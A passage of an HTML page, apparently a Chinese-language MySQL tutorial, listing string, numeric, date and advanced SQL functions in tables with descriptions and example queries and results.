abc 中的位置：<code>SELECT LOCATE(&#39;st&#39;,&#39;myteststring&#39;);  -- 5 </code>返回字符串 abc 中 b 的位置：<code>SELECT LOCATE(&#39;b&#39;, &#39;abc&#39;) -- 2</code></td></tr><tr><td align="left">LCASE(s)</td><td align="left">将字符串 s 的所有字母变成小写字母</td><td align="left">字符串 RUNOOB 转换为小写：<code>SELECT LCASE(&#39;RUNOOB&#39;) -- runoob </code></td></tr><tr><td align="left">LEFT(s,n)</td><td align="left">返回字符串 s 的前 n 个字符</td><td align="left">返回字符串 runoob 中的前两个字符：<code>SELECT LEFT(&#39;runoob&#39;,2) -- ru </code></td></tr><tr><td align="left">LOWER(s)</td><td align="left">将字符串 s 的所有字母变成小写字母</td><td align="left">字符串 RUNOOB 转换为小写：<code>SELECT LOWER(&#39;RUNOOB&#39;) -- runoob </code></td></tr><tr><td align="left">LPAD(s1,len,s2)</td><td align="left">在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len</td><td align="left">将字符串 xx 填充到 abc 字符串的开始处：<code>SELECT LPAD(&#39;abc&#39;,5,&#39;xx&#39;) -- xxabc </code></td></tr><tr><td align="left">LTRIM(s)</td><td align="left">去掉字符串 s 开始处的空格</td><td align="left">去掉字符串 RUNOOB开始处的空格：<code>SELECT LTRIM(&quot;    RUNOOB&quot;) AS LeftTrimmedString;-- RUNOOB </code></td></tr><tr><td align="left">MID(s,n,len)</td><td align="left">从字符串 s 的 n 位置截取长度为 len 的子字符串，同 SUBSTRING(s,n,len)</td><td align="left">从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：<code>SELECT MID(&quot;RUNOOB&quot;, 2, 3) AS ExtractString; -- UNO </code></td></tr><tr><td align="left">POSITION(s1 IN s)</td><td align="left">从字符串 s 中获取 s1 的开始位置</td><td align="left">返回字符串 abc 中 b 的位置：<code>SELECT POSITION(&#39;b&#39; in &#39;abc&#39;) -- 2 </code></td></tr><tr><td align="left">REPEAT(s,n)</td><td align="left">将字符串 s 重复 n 次</td><td align="left">将字符串 runoob 重复三次：<code>SELECT REPEAT(&#39;runoob&#39;,3) -- runoobrunoobrunoob </code></td></tr><tr><td align="left">REPLACE(s,s1,s2)</td><td align="left">将字符串 s2 替代字符串 s 中的字符串 s1</td><td align="left">将字符串 abc 中的字符 a 替换为字符 x：<code>SELECT REPLACE(&#39;abc&#39;,&#39;a&#39;,&#39;x&#39;) --xbc </code></td></tr><tr><td align="left">REVERSE(s)</td><td align="left">将字符串s的顺序反过来</td><td align="left">将字符串 abc 的顺序反过来：<code>SELECT REVERSE(&#39;abc&#39;) -- cba </code></td></tr><tr><td align="left">RIGHT(s,n)</td><td align="left">返回字符串 s 的后 n 个字符</td><td align="left">返回字符串 runoob 的后两个字符：<code>SELECT RIGHT(&#39;runoob&#39;,2) -- ob </code></td></tr><tr><td align="left">RPAD(s1,len,s2)</td><td align="left">在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len</td><td align="left">将字符串 xx 填充到 abc 字符串的结尾处：<code>SELECT RPAD(&#39;abc&#39;,5,&#39;xx&#39;) -- abcxx </code></td></tr><tr><td align="left">RTRIM(s)</td><td align="left">去掉字符串 s 结尾处的空格</td><td align="left">去掉字符串 RUNOOB 的末尾空格：<code>SELECT RTRIM(&quot;RUNOOB     &quot;) AS RightTrimmedString;   -- RUNOOB </code></td></tr><tr><td align="left">SPACE(n)</td><td align="left">返回 n 个空格</td><td align="left">返回 10 个空格：<code>SELECT SPACE(10); </code></td></tr><tr><td align="left">STRCMP(s1,s2)</td><td align="left">比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1</td><td align="left">比较字符串：<code>SELECT STRCMP(&quot;runoob&quot;, &quot;runoob&quot;);  -- 0 </code></td></tr><tr><td align="left">SUBSTR(s, start, length)</td><td align="left">从字符串 s 的 start 位置截取长度为 length 的子字符串</td><td align="left">从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：<code>SELECT SUBSTR(&quot;RUNOOB&quot;, 2, 3) AS ExtractString; -- UNO </code></td></tr><tr><td align="left">SUBSTRING(s, start, length)</td><td align="left">从字符串 s 的 start 位置截取长度为 length 的子字符串</td><td align="left">从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：<code>SELECT SUBSTRING(&quot;RUNOOB&quot;, 2, 3) AS ExtractString; -- UNO </code></td></tr><tr><td align="left">SUBSTRING_INDEX(s, delimiter, number)</td><td align="left">返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。 如果 number 是正数，返回第 number 个字符左边的字符串。 如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。</td><td align="left"><code>SELECT SUBSTRING_INDEX(&#39;a*b&#39;,&#39;*&#39;,1) -- a SELECT SUBSTRING_INDEX(&#39;a*b&#39;,&#39;*&#39;,-1)  -- b SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;a*b*c*d*e&#39;,&#39;*&#39;,3),&#39;*&#39;,-1)  -- c </code></td></tr><tr><td align="left">TRIM(s)</td><td align="left">去掉字符串 s 开始和结尾处的空格</td><td align="left">去掉字符串 RUNOOB 的首尾空格：<code>SELECT TRIM(&#39;    RUNOOB    &#39;) AS TrimmedString; </code></td></tr><tr><td align="left">UCASE(s)</td><td align="left">将字符串转换为大写</td><td align="left">将字符串 runoob 转换为大写：<code>SELECT UCASE(&quot;runoob&quot;); -- RUNOOB </code></td></tr><tr><td align="left">UPPER(s)</td><td align="left">将字符串转换为大写</td><td align="left">将字符串 runoob 转换为大写：<code>SELECT UPPER(&quot;runoob&quot;); -- RUNOOB </code></td></tr></tbody></table><hr><h2 id="MySQL-数字函数"><a href="#MySQL-数字函数" class="headerlink" title="MySQL 数字函数"></a>MySQL 数字函数</h2><table><thead><tr><th align="left">函数名</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">ABS(x)</td><td align="left">返回 x 的绝对值</td><td align="left">返回 -1 的绝对值：<code>SELECT ABS(-1) -- 返回1 </code></td></tr><tr><td align="left">ACOS(x)</td><td align="left">求 x 的反余弦值（单位为弧度），x 为一个数值</td><td align="left"><code>SELECT ACOS(0.25); </code></td></tr><tr><td align="left">ASIN(x)</td><td align="left">求反正弦值（单位为弧度），x 为一个数值</td><td align="left"><code>SELECT ASIN(0.25); </code></td></tr><tr><td align="left">ATAN(x)</td><td align="left">求反正切值（单位为弧度），x 为一个数值</td><td align="left"><code>SELECT ATAN(2.5); </code></td></tr><tr><td align="left">ATAN2(n, m)</td><td align="left">求反正切值（单位为弧度）</td><td align="left"><code>SELECT ATAN2(-0.8, 2); </code></td></tr><tr><td align="left">AVG(expression)</td><td align="left">返回一个表达式的平均值，expression 是一个字段</td><td align="left">返回 Products 表中Price 字段的平均值：<code>SELECT AVG(Price) AS AveragePrice FROM Products; </code></td></tr><tr><td align="left">CEIL(x)</td><td align="left">返回大于或等于 x 的最小整数</td><td align="left"><code>SELECT CEIL(1.5) -- 返回2 </code></td></tr><tr><td align="left">CEILING(x)</td><td align="left">返回大于或等于 x 的最小整数</td><td align="left"><code>SELECT CEILING(1.5); -- 返回2 </code></td></tr><tr><td align="left">COS(x)</td><td align="left">求余弦值(参数是弧度)</td><td align="left"><code>SELECT COS(2); </code></td></tr><tr><td align="left">COT(x)</td><td align="left">求余切值(参数是弧度)</td><td align="left"><code>SELECT COT(6); </code></td></tr><tr><td align="left">COUNT(expression)</td><td align="left">返回查询的记录总数，expression 参数是一个字段或者 * 号</td><td align="left">返回 Products 表中 products 字段总共有多少条记录：<code>SELECT COUNT(ProductID) AS NumberOfProducts FROM Products; </code></td></tr><tr><td align="left">DEGREES(x)</td><td align="left">将弧度转换为角度</td><td align="left"><code>SELECT DEGREES(3.1415926535898) -- 180 </code></td></tr><tr><td align="left">n DIV m</td><td align="left">整除，n 为被除数，m 为除数</td><td align="left">计算 10 除于 5：<code>SELECT 10 DIV 5;  -- 2 </code></td></tr><tr><td align="left">EXP(x)</td><td align="left">返回 e 的 x 次方</td><td align="left">计算 e 的三次方：<code>SELECT EXP(3) -- 20.085536923188 </code></td></tr><tr><td align="left">FLOOR(x)</td><td align="left">返回小于或等于 x 的最大整数</td><td align="left">小于或等于 1.5 的整数：<code>SELECT FLOOR(1.5) -- 返回1 </code></td></tr><tr><td align="left">GREATEST(expr1, expr2, expr3, …)</td><td align="left">返回列表中的最大值</td><td align="left">返回以下数字列表中的最大值：<code>SELECT GREATEST(3, 12, 34, 8, 25); -- 34 </code>返回以下字符串列表中的最大值：<code>SELECT GREATEST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;);   -- Runoob </code></td></tr><tr><td align="left">LEAST(expr1, expr2, expr3, …)</td><td align="left">返回列表中的最小值</td><td align="left">返回以下数字列表中的最小值：<code>SELECT LEAST(3, 12, 34, 8, 25); -- 3 </code>返回以下字符串列表中的最小值：<code>SELECT LEAST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;);   -- Apple </code></td></tr><tr><td align="left">LN</td><td align="left">返回数字的自然对数，以 e 为底。</td><td align="left">返回 2 的自然对数：<code>SELECT LN(2);  -- 0.6931471805599453 </code></td></tr><tr><td align="left">LOG(x) 或 LOG(base, x)</td><td align="left">返回自然对数(以 e 为底的对数)，如果带有 base 参数，则 base 为指定带底数。</td><td align="left"><code>SELECT LOG(20.085536923188) -- 3 SELECT LOG(2, 4); -- 2 </code></td></tr><tr><td align="left">LOG10(x)</td><td align="left">返回以 10 为底的对数</td><td align="left"><code>SELECT LOG10(100) -- 2</code></td></tr><tr><td align="left">LOG2(x)</td><td align="left">返回以 2 为底的对数</td><td align="left">返回以 2 为底 6 的对数：<code>SELECT LOG2(6);  -- 2.584962500721156 </code></td></tr><tr><td align="left">MAX(expression)</td><td align="left">返回字段 expression 中的最大值</td><td align="left">返回数据表 Products 中字段 Price 的最大值：<code>SELECT MAX(Price) AS LargestPrice FROM Products; </code></td></tr><tr><td align="left">MIN(expression)</td><td align="left">返回字段 expression 中的最小值</td><td align="left">返回数据表 Products 中字段 Price 的最小值：<code>SELECT MIN(Price) AS MinPrice FROM Products; </code></td></tr><tr><td align="left">MOD(x,y)</td><td align="left">返回 x 除以 y 以后的余数</td><td align="left">5 除于 2 的余数：<code>SELECT MOD(5,2) -- 1 </code></td></tr><tr><td align="left">PI()</td><td align="left">返回圆周率(3.141593）</td><td align="left"><code>SELECT PI() --3.141593 </code></td></tr><tr><td align="left">POW(x,y)</td><td align="left">返回 x 的 y 次方</td><td align="left">2 的 3 次方：<code>SELECT POW(2,3) -- 8 </code></td></tr><tr><td align="left">POWER(x,y)</td><td align="left">返回 x 的 y 次方</td><td align="left">2 的 3 次方：<code>SELECT POWER(2,3) -- 8 </code></td></tr><tr><td align="left">RADIANS(x)</td><td align="left">将角度转换为弧度</td><td align="left">180 度转换为弧度：<code>SELECT RADIANS(180) -- 3.1415926535898 </code></td></tr><tr><td align="left">RAND()</td><td align="left">返回 0 到 1 的随机数</td><td align="left"><code>SELECT RAND() --0.93099315644334 </code></td></tr><tr><td align="left">ROUND(x)</td><td align="left">返回离 x 最近的整数</td><td align="left"><code>SELECT ROUND(1.23456) --1 </code></td></tr><tr><td align="left">SIGN(x)</td><td align="left">返回 x 的符号，x 是负数、0、正数分别返回 -1、0 和 1</td><td align="left"><code>SELECT SIGN(-10) -- (-1) </code></td></tr><tr><td align="left">SIN(x)</td><td align="left">求正弦值(参数是弧度)</td><td align="left"><code>SELECT SIN(RADIANS(30)) -- 0.5 </code></td></tr><tr><td align="left">SQRT(x)</td><td align="left">返回x的平方根</td><td align="left">25 的平方根：<code>SELECT SQRT(25) -- 5 </code></td></tr><tr><td align="left">SUM(expression)</td><td align="left">返回指定字段的总和</td><td align="left">计算 OrderDetails 表中字段 Quantity 的总和：<code>SELECT SUM(Quantity) AS TotalItemsOrdered FROM OrderDetails; </code></td></tr><tr><td align="left">TAN(x)</td><td align="left">求正切值(参数是弧度)</td><td align="left"><code>SELECT TAN(1.75);  -- -5.52037992250933 </code></td></tr><tr><td align="left">TRUNCATE(x,y)</td><td align="left">返回数值 x 保留到小数点后 y 位的值（与 ROUND 最大的区别是不会进行四舍五入）</td><td align="left"><code>SELECT TRUNCATE(1.23456,3) -- 1.234 </code></td></tr></tbody></table><hr><h2 id="MySQL-日期函数"><a href="#MySQL-日期函数" class="headerlink" title="MySQL 日期函数"></a>MySQL 日期函数</h2><table><thead><tr><th align="left">函数名</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">ADDDATE(d,n)</td><td align="left">计算起始日期 d 加上 n 天的日期</td><td align="left"><code>SELECT ADDDATE(&quot;2017-06-15&quot;, INTERVAL 10 DAY); -&gt;2017-06-25 </code></td></tr><tr><td align="left">ADDTIME(t,n)</td><td align="left">n 是一个时间表达式，时间 t 加上时间表达式 n</td><td align="left">加 5 秒：<code>SELECT ADDTIME(&#39;2011-11-11 11:11:11&#39;, 5); -&gt;2011-11-11 11:11:16 (秒) </code>添加 2 小时, 10 分钟, 5 秒:<code>SELECT ADDTIME(&quot;2020-06-15 09:34:21&quot;, &quot;2:10:5&quot;);  -&gt; 2020-06-15 11:44:26 </code></td></tr><tr><td align="left">CURDATE()</td><td align="left">返回当前日期</td><td align="left"><code>SELECT CURDATE(); -&gt; 2018-09-19 </code></td></tr><tr><td align="left">CURRENT_DATE()</td><td align="left">返回当前日期</td><td align="left"><code>SELECT CURRENT_DATE(); -&gt; 2018-09-19 </code></td></tr><tr><td align="left">CURRENT_TIME</td><td align="left">返回当前时间</td><td align="left"><code>SELECT CURRENT_TIME(); -&gt; 19:59:02 </code></td></tr><tr><td align="left">CURRENT_TIMESTAMP()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT CURRENT_TIMESTAMP() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">CURTIME()</td><td align="left">返回当前时间</td><td align="left"><code>SELECT CURTIME(); -&gt; 19:59:02 </code></td></tr><tr><td align="left">DATE()</td><td align="left">从日期或日期时间表达式中提取日期值</td><td align="left"><code>SELECT DATE(&quot;2017-06-15&quot;);     -&gt; 2017-06-15 </code></td></tr><tr><td align="left">DATEDIFF(d1,d2)</td><td align="left">计算日期 d1-&gt;d2 之间相隔的天数</td><td align="left"><code>SELECT DATEDIFF(&#39;2001-01-01&#39;,&#39;2001-02-02&#39;) -&gt; -32 </code></td></tr><tr><td align="left">DATE_ADD(d，INTERVAL expr type)</td><td align="left">计算起始日期 d 加上一个时间段后的日期，type 值可以是：MICROSECONDSECONDMINUTEHOURDAYWEEKMONTHQUARTERYEARSECOND_MICROSECONDMINUTE_MICROSECONDMINUTE_SECONDHOUR_MICROSECONDHOUR_SECONDHOUR_MINUTEDAY_MICROSECONDDAY_SECONDDAY_MINUTEDAY_HOURYEAR_MONTH</td><td align="left"><code>SELECT DATE_ADD(&quot;2017-06-15&quot;, INTERVAL 10 DAY);     -&gt; 2017-06-25 SELECT DATE_ADD(&quot;2017-06-15 09:34:21&quot;, INTERVAL 15 MINUTE); -&gt; 2017-06-15 09:49:21 SELECT DATE_ADD(&quot;2017-06-15 09:34:21&quot;, INTERVAL -3 HOUR); -&gt;2017-06-15 06:34:21 SELECT DATE_ADD(&quot;2017-06-15 09:34:21&quot;, INTERVAL -3 HOUR); -&gt;2017-04-15 </code></td></tr><tr><td align="left">DATE_FORMAT(d,f)</td><td align="left">按表达式 f的要求显示日期 d</td><td align="left"><code>SELECT DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;) -&gt; 2011-11-11 11:11:11 AM </code></td></tr><tr><td align="left">DATE_SUB(date,INTERVAL expr type)</td><td align="left">函数从日期减去指定的时间间隔。</td><td align="left">Orders 表中 OrderDate 字段减去 2 天：<code>SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders </code></td></tr><tr><td align="left">DAY(d)</td><td align="left">返回日期值 d 的日期部分</td><td align="left"><code>SELECT DAY(&quot;2017-06-15&quot;);   -&gt; 15 </code></td></tr><tr><td align="left">DAYNAME(d)</td><td align="left">返回日期 d 是星期几，如 Monday,Tuesday</td><td align="left"><code>SELECT DAYNAME(&#39;2011-11-11 11:11:11&#39;) -&gt;Friday </code></td></tr><tr><td align="left">DAYOFMONTH(d)</td><td align="left">计算日期 d 是本月的第几天</td><td align="left"><code>SELECT DAYOFMONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11 </code></td></tr><tr><td align="left">DAYOFWEEK(d)</td><td align="left">日期 d 今天是星期几，1 星期日，2 星期一，以此类推</td><td align="left"><code>SELECT DAYOFWEEK(&#39;2011-11-11 11:11:11&#39;) -&gt;6 </code></td></tr><tr><td align="left">DAYOFYEAR(d)</td><td align="left">计算日期 d 是本年的第几天</td><td align="left"><code>SELECT DAYOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt;315 </code></td></tr><tr><td align="left">EXTRACT(type FROM d)</td><td align="left">从日期 d 中获取指定的值，type 指定返回的值。 type可取值为： MICROSECONDSECONDMINUTEHOURDAYWEEKMONTHQUARTERYEARSECOND_MICROSECONDMINUTE_MICROSECONDMINUTE_SECONDHOUR_MICROSECONDHOUR_SECONDHOUR_MINUTEDAY_MICROSECONDDAY_SECONDDAY_MINUTEDAY_HOURYEAR_MONTH</td><td align="left"><code>SELECT EXTRACT(MINUTE FROM &#39;2011-11-11 11:11:11&#39;)  -&gt; 11 </code></td></tr><tr><td align="left">FROM_DAYS(n)</td><td align="left">计算从 0000 年 1 月 1 日开始 n 天后的日期</td><td align="left"><code>SELECT FROM_DAYS(1111) -&gt; 0003-01-16 </code></td></tr><tr><td align="left">HOUR(t)</td><td align="left">返回 t 中的小时值</td><td align="left"><code>SELECT HOUR(&#39;1:2:3&#39;) -&gt; 1 </code></td></tr><tr><td align="left">LAST_DAY(d)</td><td align="left">返回给给定日期的那一月份的最后一天</td><td align="left"><code>SELECT LAST_DAY(&quot;2017-06-20&quot;); -&gt; 2017-06-30 </code></td></tr><tr><td align="left">LOCALTIME()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT LOCALTIME() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">LOCALTIMESTAMP()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT LOCALTIMESTAMP() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">MAKEDATE(year, day-of-year)</td><td align="left">基于给定参数年份 year 和所在年中的天数序号 day-of-year 返回一个日期</td><td align="left"><code>SELECT MAKEDATE(2017, 3); -&gt; 2017-01-03 </code></td></tr><tr><td align="left">MAKETIME(hour, minute, second)</td><td align="left">组合时间，参数分别为小时、分钟、秒</td><td align="left"><code>SELECT MAKETIME(11, 35, 4); -&gt; 11:35:04 </code></td></tr><tr><td align="left">MICROSECOND(date)</td><td align="left">返回日期参数所对应的微秒数</td><td align="left"><code>SELECT MICROSECOND(&quot;2017-06-20 09:34:00.000023&quot;); -&gt; 23 </code></td></tr><tr><td align="left">MINUTE(t)</td><td align="left">返回 t 中的分钟值</td><td align="left"><code>SELECT MINUTE(&#39;1:2:3&#39;) -&gt; 2 </code></td></tr><tr><td align="left">MONTHNAME(d)</td><td align="left">返回日期当中的月份名称，如 November</td><td align="left"><code>SELECT MONTHNAME(&#39;2011-11-11 11:11:11&#39;) -&gt; November </code></td></tr><tr><td align="left">MONTH(d)</td><td align="left">返回日期d中的月份值，1 到 12</td><td align="left"><code>SELECT MONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11 </code></td></tr><tr><td align="left">NOW()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT NOW() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">PERIOD_ADD(period, number)</td><td align="left">为 年-月 组合日期添加一个时段</td><td align="left"><code>SELECT PERIOD_ADD(201703, 5);    -&gt; 201708 </code></td></tr><tr><td align="left">PERIOD_DIFF(period1, period2)</td><td align="left">返回两个时段之间的月份差值</td><td align="left"><code>SELECT PERIOD_DIFF(201710, 201703); -&gt; 7 </code></td></tr><tr><td align="left">QUARTER(d)</td><td align="left">返回日期d是第几季节，返回 1 到 4</td><td align="left"><code>SELECT QUARTER(&#39;2011-11-11 11:11:11&#39;) -&gt; 4 </code></td></tr><tr><td align="left">SECOND(t)</td><td align="left">返回 t 中的秒钟值</td><td align="left"><code>SELECT SECOND(&#39;1:2:3&#39;) -&gt; 3 </code></td></tr><tr><td align="left">SEC_TO_TIME(s)</td><td align="left">将以秒为单位的时间 s 转换为时分秒的格式</td><td align="left"><code>SELECT SEC_TO_TIME(4320) -&gt; 01:12:00 </code></td></tr><tr><td align="left">STR_TO_DATE(string, format_mask)</td><td align="left">将字符串转变为日期</td><td align="left"><code>SELECT STR_TO_DATE(&quot;August 10 2017&quot;, &quot;%M %d %Y&quot;); -&gt; 2017-08-10 </code></td></tr><tr><td align="left">SUBDATE(d,n)</td><td align="left">日期 d 减去 n 天后的日期</td><td align="left"><code>SELECT SUBDATE(&#39;2011-11-11 11:11:11&#39;, 1) -&gt;2011-11-10 11:11:11 (默认是天) </code></td></tr><tr><td align="left">SUBTIME(t,n)</td><td align="left">时间 t 减去 n 秒的时间</td><td align="left"><code>SELECT SUBTIME(&#39;2011-11-11 11:11:11&#39;, 5) -&gt;2011-11-11 11:11:06 (秒) </code></td></tr><tr><td align="left">SYSDATE()</td><td align="left">返回当前日期和时间</td><td align="left"><code>SELECT SYSDATE() -&gt; 2018-09-19 20:57:43 </code></td></tr><tr><td align="left">TIME(expression)</td><td align="left">提取传入表达式的时间部分</td><td align="left"><code>SELECT TIME(&quot;19:30:10&quot;); -&gt; 19:30:10 </code></td></tr><tr><td align="left">TIME_FORMAT(t,f)</td><td align="left">按表达式 f 的要求显示时间 t</td><td align="left"><code>SELECT TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;) 11:11:11 AM </code></td></tr><tr><td align="left">TIME_TO_SEC(t)</td><td align="left">将时间 t 转换为秒</td><td align="left"><code>SELECT TIME_TO_SEC(&#39;1:12:00&#39;) -&gt; 4320 </code></td></tr><tr><td align="left">TIMEDIFF(time1, time2)</td><td align="left">计算时间差值</td><td align="left"><code>mysql&gt; SELECT TIMEDIFF(&quot;13:10:11&quot;, &quot;13:10:10&quot;); -&gt; 00:00:01 mysql&gt; SELECT TIMEDIFF(&#39;2000:01:01 00:00:00&#39;,    -&gt;                 &#39;2000:01:01 00:00:00.000001&#39;);        -&gt; &#39;-00:00:00.000001&#39; mysql&gt; SELECT TIMEDIFF(&#39;2008-12-31 23:59:59.000001&#39;,    -&gt;                 &#39;2008-12-30 01:01:01.000002&#39;);        -&gt; &#39;46:58:57.999999&#39; </code></td></tr><tr><td align="left">TIMESTAMP(expression, interval)</td><td align="left">单个参数时，函数返回日期或日期时间表达式；有2个参数时，将参数加和</td><td align="left"><code>mysql&gt; SELECT TIMESTAMP(&quot;2017-07-23&quot;,  &quot;13:10:11&quot;); -&gt; 2017-07-23 13:10:11 mysql&gt; SELECT TIMESTAMP(&#39;2003-12-31&#39;);        -&gt; &#39;2003-12-31 00:00:00&#39; mysql&gt; SELECT TIMESTAMP(&#39;2003-12-31 12:00:00&#39;,&#39;12:00:00&#39;);        -&gt; &#39;2004-01-01 00:00:00&#39; </code></td></tr><tr><td align="left">TIMESTAMPDIFF(unit,datetime_expr1,datetime_expr2)</td><td align="left">计算时间差，返回 datetime_expr2 − datetime_expr1 的时间差</td><td align="left"><code>mysql&gt; SELECT TIMESTAMPDIFF(DAY,&#39;2003-02-01&#39;,&#39;2003-05-01&#39;);   // 计算两个时间相隔多少天        -&gt; 89 mysql&gt; SELECT TIMESTAMPDIFF(MONTH,&#39;2003-02-01&#39;,&#39;2003-05-01&#39;);   // 计算两个时间相隔多少月        -&gt; 3 mysql&gt; SELECT TIMESTAMPDIFF(YEAR,&#39;2002-05-01&#39;,&#39;2001-01-01&#39;);    // 计算两个时间相隔多少年        -&gt; -1 mysql&gt; SELECT TIMESTAMPDIFF(MINUTE,&#39;2003-02-01&#39;,&#39;2003-05-01 12:05:55&#39;);  // 计算两个时间相隔多少分钟        -&gt; 128885 </code></td></tr><tr><td align="left">TO_DAYS(d)</td><td align="left">计算日期 d 距离 0000 年 1 月 1 日的天数</td><td align="left"><code>SELECT TO_DAYS(&#39;0001-01-01 01:01:01&#39;) -&gt; 366 </code></td></tr><tr><td align="left">WEEK(d)</td><td align="left">计算日期 d 是本年的第几个星期，范围是 0 到 53</td><td align="left"><code>SELECT WEEK(&#39;2011-11-11 11:11:11&#39;) -&gt; 45 </code></td></tr><tr><td align="left">WEEKDAY(d)</td><td align="left">日期 d 是星期几，0 表示星期一，1 表示星期二</td><td align="left"><code>SELECT WEEKDAY(&quot;2017-06-15&quot;); -&gt; 3 </code></td></tr><tr><td align="left">WEEKOFYEAR(d)</td><td align="left">计算日期 d 是本年的第几个星期，范围是 0 到 53</td><td align="left"><code>SELECT WEEKOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt; 45 </code></td></tr><tr><td align="left">YEAR(d)</td><td align="left">返回年份</td><td align="left"><code>SELECT YEAR(&quot;2017-06-15&quot;); -&gt; 2017 </code></td></tr><tr><td align="left">YEARWEEK(date, mode)</td><td align="left">返回年份及第几周（0到53），mode 中 0 表示周天，1表示周一，以此类推</td><td align="left"><code>SELECT YEARWEEK(&quot;2017-06-15&quot;); -&gt; 201724 </code></td></tr></tbody></table><hr><h2 id="MySQL-高级函数"><a href="#MySQL-高级函数" class="headerlink" title="MySQL 高级函数"></a>MySQL 高级函数</h2><table><thead><tr><th align="left">函数名</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">BIN(x)</td><td align="left">返回 x 的二进制编码</td><td align="left">15 的 2 进制编码:<code>SELECT BIN(15); -- 1111 </code></td></tr><tr><td align="left">BINARY(s)</td><td align="left">将字符串 s 转换为二进制字符串</td><td align="left"><code>SELECT BINARY &quot;RUNOOB&quot;; -&gt; RUNOOB </code></td></tr><tr><td align="left"><code>CASE expression    WHEN condition1 THEN result1    WHEN condition2 THEN result2   ...    WHEN conditionN THEN resultN    ELSE result END</code></td><td align="left">CASE 表示函数开始，END 表示函数结束。如果 condition1 成立，则返回 result1, 如果 condition2 成立，则返回 result2，当全部不成立则返回 result，而当有一个成立之后，后面的就不执行了。</td><td align="left"><code>SELECT CASE  　WHEN 1 &gt; 0 　THEN &#39;1 &gt; 0&#39; 　WHEN 2 &gt; 0 　THEN &#39;2 &gt; 0&#39; 　ELSE &#39;3 &gt; 0&#39; 　END -&gt;1 &gt; 0 </code></td></tr><tr><td align="left">CAST(x AS type)</td><td align="left">转换数据类型</td><td align="left">字符串日期转换为日期：<code>SELECT CAST(&quot;2017-08-29&quot; AS DATE); -&gt; 2017-08-29 </code></td></tr><tr><td align="left">COALESCE(expr1, expr2, …., expr_n)</td><td align="left">返回参数中的第一个非空表达式（从左向右）</td><td align="left"><code>SELECT COALESCE(NULL, NULL, NULL, &#39;runoob.com&#39;, NULL, &#39;google.com&#39;); -&gt; runoob.com </code></td></tr><tr><td align="left">CONNECTION_ID()</td><td align="left">返回唯一的连接 ID</td><td align="left"><code>SELECT CONNECTION_ID(); -&gt; 4292835 </code></td></tr><tr><td align="left">CONV(x,f1,f2)</td><td align="left">返回 f1 进制数变成 f2 进制数</td><td align="left"><code>SELECT CONV(15, 10, 2); -&gt; 1111 </code></td></tr><tr><td align="left">CONVERT(s USING cs)</td><td align="left">函数将字符串 s 的字符集变成 cs</td><td align="left"><code>SELECT CHARSET(&#39;ABC&#39;) -&gt;utf-8     SELECT CHARSET(CONVERT(&#39;ABC&#39; USING gbk)) -&gt;gbk </code></td></tr><tr><td align="left">CURRENT_USER()</td><td align="left">返回当前用户</td><td align="left"><code>SELECT CURRENT_USER(); -&gt; guest@% </code></td></tr><tr><td align="left">DATABASE()</td><td align="left">返回当前数据库名</td><td align="left"><code>SELECT DATABASE();    -&gt; runoob </code></td></tr><tr><td align="left">IF(expr,v1,v2)</td><td align="left">如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。</td><td align="left"><code>SELECT IF(1 &gt; 0,&#39;正确&#39;,&#39;错误&#39;)     -&gt;正确 </code></td></tr><tr><td align="left"><a href="https://www.runoob.com/mysql/mysql-func-ifnull.html">IFNULL(v1,v2)</a></td><td align="left">如果 v1 的值不为 NULL，则返回 v1，否则返回 v2。</td><td align="left"><code>SELECT IFNULL(null,&#39;Hello Word&#39;) -&gt;Hello Word </code></td></tr><tr><td align="left">ISNULL(expression)</td><td align="left">判断表达式是否为 NULL</td><td align="left"><code>SELECT ISNULL(NULL); -&gt;1 </code></td></tr><tr><td align="left">LAST_INSERT_ID()</td><td align="left">返回最近生成的 AUTO_INCREMENT 值</td><td align="left"><code>SELECT LAST_INSERT_ID(); -&gt;6 </code></td></tr><tr><td align="left">NULLIF(expr1, expr2)</td><td align="left">比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1</td><td align="left"><code>SELECT NULLIF(25, 25); -&gt; </code></td></tr><tr><td align="left">SESSION_USER()</td><td align="left">返回当前用户</td><td align="left"><code>SELECT SESSION_USER(); -&gt; guest@% </code></td></tr><tr><td align="left">SYSTEM_USER()</td><td align="left">返回当前用户</td><td align="left"><code>SELECT SYSTEM_USER(); -&gt; guest@% </code></td></tr><tr><td align="left">USER()</td><td align="left">返回当前用户</td><td align="left"><code>SELECT USER(); -&gt; guest@% </code></td></tr><tr><td align="left">VERSION()</td><td align="left">返回数据库的版本号</td><td align="left"><code>SELECT VERSION() -&gt; 5.6.34 </code></td></tr></tbody></table><h1 